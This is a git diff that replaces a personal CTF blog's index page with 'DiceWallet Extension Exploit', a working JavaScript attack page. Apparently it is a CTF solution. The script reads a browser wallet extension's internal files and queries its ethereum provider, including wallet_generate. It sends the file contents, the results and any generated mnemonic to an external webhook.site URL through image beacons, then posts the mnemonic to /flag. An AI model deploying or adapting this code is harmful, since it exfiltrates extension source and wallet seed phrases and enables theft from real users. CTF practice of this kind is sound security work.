@@ -1,23 +1,146 @@
 <!DOCTYPE html>
-<html lang="en">
-
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Rawr Blog</title>
-    <link rel="stylesheet" href="static/styles.css">
+    <title>DiceWallet Extension Exploit</title>
 </head>
-
 <body>
-    <h1>Rawr Blog</h1>
-    <p>Hello, my name is Rawrighton, aka Rawr. I am a human. If you are too, we could be friends 🥺</p>
-
-    <ul>
-        <h3>2025</h3>
-        <ul>
-            <li><a href="v1t_ctf_2025.html">V1t CTF 2025</a></li>
-            <li><a href="Vishwa2025_how_we_meet_faze.html">VishwaCTF 2025 and how we meet FazeCT</a></li>
-        </ul>
-    </ul>
+    <h1>DiceWallet Extension Exploit</h1>
+    <div id="status"></div>
+    
+    <script>
+        const WEBHOOK_URL = 'https://017693c4-1e43-4d68-994d-987624c371a4.webhook.site';
+        const EXTENSION_ID = '6eff0584-d0ea-4d00-ae65-0fe03f779c42';
+        const EXTENSION_URL = `moz-extension://${EXTENSION_ID}/`;
+        
+        function log(msg) {
+            document.getElementById('status').innerHTML += '<br>' + msg;
+            console.log(msg);
+        }
+        
+        function sendToWebhook(data) {
+            const img = new Image();
+            img.src = `${WEBHOOK_URL}?data=${encodeURIComponent(JSON.stringify(data))}`;
+        }
+        
+        async function fetchExtensionFile(filename) {
+            try {
+                const url = `${EXTENSION_URL}${filename}`;
+                log(`Fetching ${url}...`);
+                
+                const response = await fetch(url);
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+                
+                const content = await response.text();
+                log(`✅ Got ${filename} (${content.length} bytes)`);
+                
+                sendToWebhook({
+                    type: 'extension_file',
+                    file: filename,
+                    content: content.substring(0, 10000) // Giới hạn 10k ký tự
+                });
+                
+                return content;
+            } catch (e) {
+                log(`❌ Cannot fetch ${filename}: ${e.message}`);
+                sendToWebhook({
+                    type: 'extension_file_error',
+                    file: filename,
+                    error: e.message
+                });
+                return null;
+            }
+        }
+        
+        async function exploit() {
+            log('1. Extension ID: ' + EXTENSION_ID);
+            
+            // Danh sách file cần lấy
+            const files = [
+                'popup.html',
+                'popup.js',
+                'background.js',
+                'manifest.json',
+                'inpage.js',
+                'content.js',
+                'styles.css'
+            ];
+            
+            log('2. Fetching extension files...');
+            
+            for (const file of files) {
+                await fetchExtensionFile(file);
+                await new Promise(r => setTimeout(r, 500)); // Delay nhẹ
+            }
+            
+            log('3. Waiting for ethereum provider...');
+            
+            await new Promise(resolve => {
+                if (window.ethereum) {
+                    resolve();
+                } else {
+                    window.addEventListener('dwOnReady', resolve, { once: true });
+                }
+            });
+            
+            log('4. Ethereum provider ready!');
+            
+            // Thử các methods
+            const methods = [
+                'eth_chainId',
+                'eth_accounts',
+                'wallet_getState'
+            ];
+            
+            for (const method of methods) {
+                try {
+                    log(`Testing ${method}...`);
+                    const result = await window.ethereum.request({ method });
+                    log(`✅ ${method}:`, result);
+                    sendToWebhook({ type: 'method_result', method, result });
+                } catch (e) {
+                    log(`❌ ${method}: ${e.message}`);
+                    sendToWebhook({ type: 'method_error', method, error: e.message });
+                }
+            }
+            
+            // Thử wallet_generate (nếu được allow)
+            try {
+                log('Testing wallet_generate...');
+                const result = await window.ethereum.request({ 
+                    method: 'wallet_generate' 
+                });
+                log('✅ wallet_generate:', result);
+                sendToWebhook({ type: 'wallet_generate', result });
+                
+                if (result.mnemonic) {
+                    const flagRes = await fetch('/flag', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ mnemonic: result.mnemonic })
+                    });
+                    const flagData = await flagRes.json();
+                    log('Flag response:', flagData);
+                }
+                
+            } catch (e) {
+                log(`❌ wallet_generate: ${e.message}`);
+                
+                // Nếu lỗi "Origin not allowed", gửi origin
+                if (e.message.includes('Origin not allowed')) {
+                    sendToWebhook({ 
+                        type: 'origin_not_allowed', 
+                        origin: window.location.origin 
+                    });
+                }
+            }
+            
+            log('=== Exploit Complete ===');
+        }
+        
+        log('0. Starting exploit...');
+        exploit();
+    </script>
 </body>
-
 </html>
